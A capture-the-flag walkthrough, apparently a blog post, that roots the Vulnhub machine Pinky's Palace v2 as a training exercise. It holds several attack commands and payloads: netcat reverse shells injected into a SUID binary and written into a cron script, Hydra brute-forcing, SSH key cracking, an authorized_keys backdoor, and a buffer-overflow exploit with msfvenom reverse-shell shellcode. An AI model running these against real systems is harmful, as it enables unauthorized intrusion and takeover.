# Pinky’s Palace v2
Vulnhub virtual machine; How bad do you want OSCP box, Lets begin with this is not for the faint of heart. Enumeration to multiple pivots, reverse engineering, buffer overflow all wrapped in to one VM. This box will teach you something new guaranteed, grab a drink you’re going to need one.

----------

Legal Usage:
*The information provided by executeatwill is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risk/responsibilities.*


----------

Vulnhub Link: https://www.vulnhub.com/entry/pinkys-palace-v2,229/
File: Pinkys-Palace2.zip (Size: 1.1 GB)

Only use with VMware

Discover VM on network:

    netdiscover -r 192.168.213.0/24

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1552959933355_image.png)


Pinky’s VM shows IP address as well.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1552959969048_image.png)


Target: 192.168.213.129


# Enumeration

Nmap Scan

    nmap -sV -sC oA nmap/pinkyv2 192.168.213.129

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1552960489779_image.png)


UDP Scan with unicorn:

    unicornscan -i eth0 -mU 192.168.213.129 -v

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1552960679926_image.png)


Looking at what to be a wordpress site based off the enumeration which could lead to a wpscan.

Download robots.txt

    curl -i http://192.168.213.129/robots.txt

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1552960779007_image.png)


*no robots.txt to look at*

Change host name in `/etc/hosts`

    192.168.213.129 pinkydb


Navigating to web-server:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1552961392969_image.png)


wpscan

    wpscan --url http://pinkydb/ -u -e ap --log wpscan.out

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1552961796853_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1552962736622_image.png)


wfuzz - directory scan

    wfuzz -w /usr/share/seclists/Discovery/Web-Content/big.txt --hc 404 http://pinkydb/FUZZ

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1552962408402_image.png)


navigating to `/secret` and discovered bambam.txt

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1552962541925_image.png)


cat bambam.txt

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1552962596401_image.png)


This could ellude to a port knocking of sort…

Port Knocking Script:

    #!/bin/bash
    
    TARGET=$1
    
    for ports in $(cat permutation.txt); do
        echo "[*] Trying sequence $ports..."
        for p in $(echo $ports | tr ',' ' '); do
            nmap -n -v0 -Pn --max-retries 0 -p $p $TARGET
        done
        sleep 3
        nmap -n -v -Pn -p- -A --reason $TARGET -oN ${ports}.txt
    done

next we need to create this permutation list which will contain the port numbers mixed up. To do this a python script will be used to iterate the port numbers.

    python -c 'import itertools; print list(itertools.permutations([8890,7000,666]))' | sed 's/), /\n/g' | tr -cd '0-
    9,\n' | sort | uniq > permutation.txt

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553043103117_image.png)


launch the knock.sh script with the target ip as an argument.

    ./knock.sh 192.168.213.129

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553043150312_image.png)


discover port `7654` running a web server and navigate to said server.


![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553042904587_image.png)


click to `login.php`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553042947124_image.png)


before we attempt to hydra this login page. We need to create a wordlist. To do so we can use cewl and john to sift through that list for duplicates.

creating word list from http://pinkydb

    cewl -m3 pinkydb 2>/dev/null | sed 1d | tee cewl.txt

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553043389390_image.png)


next use john

    john --rules --wordlist=cewl.txt --stdout | tee wordlist.txt

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553043472445_image.png)


now we have a `wordlist.txt` that we can use with hydra

create usernames from our wpscan username enumeration

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553043770499_image.png)


Hydra login page - w/ `wordlist.txt`

    hydra -L username.txt -P wordlist.txt pinkydb -s 7654 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid Username or Password" -vV

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553122584160_image.png)


…

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553122612495_image.png)


Discovered the following credentials:

    \[7654\][http-post-form] host: pinkydb   login: pinky   password: Passione
    \[7654\][http-post-form] host: pinkydb   login: pinky1337   password: Hello
    \[7654\][http-post-form] host: pinkydb   login: pinkys   password: Pinky

Login webserver - `pinky:Passione`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553126306105_image.png)


Exploring Links:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553126626589_image.png)


download the ssh key locally and cat the file:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553126747599_image.png)


connecting to ssh server with private key - stefano@pinkydb

    ssh -i id_rsa stefano@pinkydb -p 4655

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553127122995_image.png)


*Key is password encrypted and we need to perform some decryption before we can use.*

Cracking the `id_rsa` with ssh2john. (for some reason my current version of `ssh2john` was not functioning but I did find an python version of the binary that functions the same off github. 
Link: https://github.com/koboi137/john/blob/master/ssh2john.py

error i was seeing:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553135441934_image.png)


run the conversion of private key to something we can use to crack:

    python ssh2john.id_rsa

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553135396158_image.png)


great, now just append it to a file with `python ssh2john.py id_rsa > id_rsajohn` 

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553135556721_image.png)


Crack converted private SSH key with `john`:

    john --wordlist=/usr/share/wordlists/rockyou.txt id_rsajohn

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553135620339_image.png)


Bingo, bango we have the password for `Stefano:secretz101`

Notes:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553126722677_image.png)





# LFI Test

based off the php - there looks to be LFI.

    .php?1337=/etc/passwd

output:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553126520422_image.png)


we can also send a reverse shell from this inclusion to gain access to the box.


# SSH as Stefano
    ssh -i id_rsa stefano@pinkydb

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553136060171_image.png)


*we are now* `*stefano*`

permissions check:

    sudo -l

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553136169177_image.png)


well, the low hanging fruit has be removed.


# Priv-esc

Looking around `~/`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553136381618_image.png)


`qsub` has a sticky bit which will allow us to run root commands. The binary has a message that i was left to communicate with Pinky. Just running the program it seems to ask for a password.

Lets attempt to crash the program with an excessive amount of “A”s

    ./qsub $(python -c "print 'A'*100")

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553136692701_image.png)


“Bad hacker! Go away” - I think not!

Enter the `gdb`:

    which gdb

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553136833233_image.png)

![confused john travolta GIF](https://media0.giphy.com/media/2vlC9FMLSmqGs/giphy.gif?cid=3640f6095c92fcf85876424d4d70a3bf)


gdb is not local…

with continued enumeration a quick check of the variable `$TERM` yielded “screen”

re-attemped the application with “screen” as the password.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553137231011_image.png)


A new message appears stating “Welcome to the Question Submit”. Might be the password might not be, but something changed.

Attempt a reverse shell injection

    ./qsub '$(nc -e /bin/bash 192.168.213.130 444)'

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553137501083_image.png)


and we have a call back!

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553137525532_image.png)


we are now the user pinky!

Spawn proper shell with python:

    python -c "import pty;pty.spawn('/bin/bash')"

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553137598332_image.png)


Investigate pinky home directory:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553202166053_image.png)


messages from `qsub` were being sent to `messages` directory.

Since there is no sudo we can have a look at what pinky is able to touch with `find`.

    find / -user pinky

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553202450436_image.png)


*a lot of “permission denied” and nothing of use.*


    find / -group pinky

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553202519924_image.png)


`backup.sh` discovered that we are able to take a loot at.

investigating the bash file

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553202602824_image.png)


*unfortunately we cannot open. Which is confusing because we are apart of the pinky group. But, after remember we upgraded from a SUID sticky bit the group list never updated.*

updating the grouplist

    newgrp

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553202740986_image.png)


*the gid has now successfully updated.*


    cat backup.sh

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553202787752_image.png)


*The file is executable and will execute at the group level so if we modify it to include another reverse shell we could achieve access of user.*

Creating reverse shell via appending backup.sh - new listener setup on 5555

    echo "nc -e /bin/bash 192.168.213.130 6666" > backup.sh

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553203984472_image.png)


*backup.sh has been overridden!  - we know wait till the cronjob is executed.*

Reverse connection received:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553204538491_image.png)


*we are now operating as user* `*demon*`

upgrade shell again with python:

    python -c "import pty;pty.spawn('/bin/bash')"

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553203110301_image.png)


Investigate the home directory:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553203200490_image.png)


*nothing of immediate usefulness. Begin again enumerating again with find command.*


    find / -user demon

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553203333338_image.png)


both directory `/daemon` and `/daemon/panel` worth investigating.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553203445583_image.png)


`panel` seems to be a binary with execute

    file panel

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553203470864_image.png)


after running `panel` I received a 

    demon@Pinkys-Palace:/daemon$ ./panel
    ....
    [-] binding to socket
    ...

this repeated over and over as if its trying to connect to a port. Thinking back to our open port `31337` might have something to do with this. With no actual way to disassemble the binary remotely we need to send the file locally.

Base64 encode file before sending to local:

    base64 panel > panelb64

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553211441242_image.png)


Send file from Remote to Local:
Local Kali:

    nc -nlvp 1111 > panelb64

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553211507743_image.png)


Remote System:

    nc 192.168.213.130 1111 < panelb64

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553211478020_image.png)


Decode Base64 `panelb64`

    base64 -d panelb64 > panel

add chmod

    chmod +x panel


----------

Create SSH Foothold:

Add ssh key to box just to make sure we have an easy return if anything.

add ssh-rsa to /home/demon/.ssh/authorized_keys && chmod 600

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553210492315_image.png)

----------


Run `panel` locally and check netstat

    ./panel
    ----
    netstat -alnp | grep panel

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553211800761_image.png)


*we indeed have panel executing a command to port 31337.*

connect to local port with nc:

    nc localhost 31337

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553211898274_image.png)




# Buffer Overflow - gdb peda

installing gdb-peta
This is going to allow us to great patterns and offsets within gdb along with some functionality to create shellcode.
github link: https://github.com/longld/peda


    cd ~/ && git clone github link: https://github.com/longld/peda && cd~/peda && echo "source [git-location]/peda.py" >> ~/.gdbinit


Launching gdb-peda against `./panel`

    gdb ./panel

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553276328284_image.png)


run binary with `r`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553277341647_image.png)


connect to port 31337 with nc

    nc localhost 31337

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553277443516_image.png)


python create A’s x200 with python

    python -c 'print "A"*200'

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553277495693_image.png)


send 200 “A”s to binary through the `nc`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553277583550_image.png)


as expected we get a SIGSEGV

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553277618636_image.png)


we know this program has a `handlecmd` which is part of our vulnerability that we will need to take over our registers in that we can search for that and print a few lines of the function

search `handlecmd`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553278689934_image.png)


print a 50 lines of the function:

    x/50i handlecmd

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553278915348_image.png)


Catching/Understanding the crash:

set a breakpoint at `0x4009aa` ret

    b *0x4009aa

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553278980609_image.png)


run binary again with `r`
connect with `nc` and send “A”s to hit breakpoint on ret

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553279211430_image.png)


gdb:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553279235544_image.png)


we experience a crash due to the fact that RBP and RSP have been filled with “A”s and the `ret` of the program will send us directly into the RSP.

continue with `si` to see the function push us to the RSP which creates a loop.

Next, we need to create a pattern

    pattern_create 150

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553290611038_image.png)


Re-attempt sending the binary on port 31337 except with our created pattern.
-close gdb with `q`
-kill handle process x2 && run gdb 

    pkill -9 panel; pkill -9 panel; gdb ./panel

run binary with `r`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553289810536_image.png)


connect to port 31337 with nc:

    nc localhost 31337

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553289854263_image.png)


send created pattern string:

    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAo
    AA

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553290644232_image.png)



gdb - binary crashes with our pattern filling the registers

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553290670811_image.png)


Finding the location of the RSP with pattern_offset
location:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553290720903_image.png)


pattern_offset:

    pattern_offset jAA9AAOAAkAAPAAlAAQAAmAARAAoAA

*(note: don’t add the \n)*

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553290945344_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553290961777_image.png)


at this point we know that 120 bytes we overwrite the RSP (stack pointer)

Create Skeleton Buffer Overflow Exploit:
requirements pwntools
to install:

    pip install pwn #or pip3 for python3

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553291846828_image.png)



create exploit.py with editor of choice

    from pwn import *
    
    HOST, PORT = "localhost", 31337
    
    payload = ''
    payload += 'A'*120
    payload += 'BBBB0000'
    payload += 'C'*30
    
    r = remote(HOST, PORT)
    r.recvuntil("=>")
    r.sendline(payload)

`q` gdb && pkill panel && re-launch gdb && `r` to run the binary

execute exploit.py:

    python exploit.py

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553292007657_image.png)


gdb:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553292032047_image.png)


panel binary crashes and we now have control of the RSP to which this is the location we are going to insert our shellcode.

check for a `jmpcall` to see if there is a `jmprsp`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553292177840_image.png)


`call rsp` visualization:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553292350320_image.png)


Next, replace our exploit “BBBB0000” with the address to call rsp “0x400cfb”

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553292597362_image.png)


we now need shellcode in our case we have 120 bytes to use:

Create shellcode with msfvenom:
-types of x64 reverse shells with `msfvenom -l`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553292961989_image.png)


syntax to create shellcode:

    msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.213.130 LPORT=4444 -f py -b 00 -o revshell.shellcode

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553293954964_image.png)


we have exactly 120 bytes of space to use and our shellcode we generated is 119 bytes.

adding + modifying exploit.py

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553294415408_image.png)


Re-exploiting our binary by closing restarting process and sending our new exploit.

----------

additional: if you require super small shellcode within 77 and 84bytes that can be achieved with zerosum0x0 script.

https://zerosum0x0.blogspot.com/2014/12/x64-linux-reverse-tcp-connect-shellcode.html


script located at github: https://github.com/zerosum0x0/SLAE64/blob/master/reverseshell/reverseshell.asm

download github repository
usage:
edit the reverseshell.asm and localip hex address in little endian format

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553296249814_image.png)


navigate to reverseshell - `cd reverseshell`


    python ../shellbuild.py -x 64 reverseshell/reverseshell.asm

output

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553296527897_image.png)


and now we have 75 bytes of working shellcode!

# Root&Loot

Re-run gdb panel + execute our newly modified exploit.py with an active listener on 4444.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553294522557_image.png)


a callback is made as `root`

Final Stretch - attacking our binary on the remote box
change the “ip” on our script to “pinkydb”

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553295245808_image.png)


setup listener

    nc -lvnp 4444

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553295277042_image.png)


**Execute**
local kali:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553295349094_image.png)


listener:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553295382581_image.png)


upgrade our shell && loot

    python -c 'import pty; pty.spawn("/bin/bash")'

![](https://d2mxuefqeaa7sj.cloudfront.net/s_BED62F41990C89A106CB796AFD39934222B229D2DA9DDD40D65C587D500DE0DE_1553295554004_image.png)


and in the end the rollercoaster of emotions has ended with a victory!

![song funk GIF](https://media1.giphy.com/media/btWM4H4vJVc0E/giphy.gif?cid=3640f6095c9568454c66736d59c849d5)




also, if you made it this far. I’m proud to say I am the new owner of **rootandloot.com!**
have any ideas for the site? drop them in the comments or find me on twitter @executeatwill

#HAILippSec

“bring me the root” -Exec

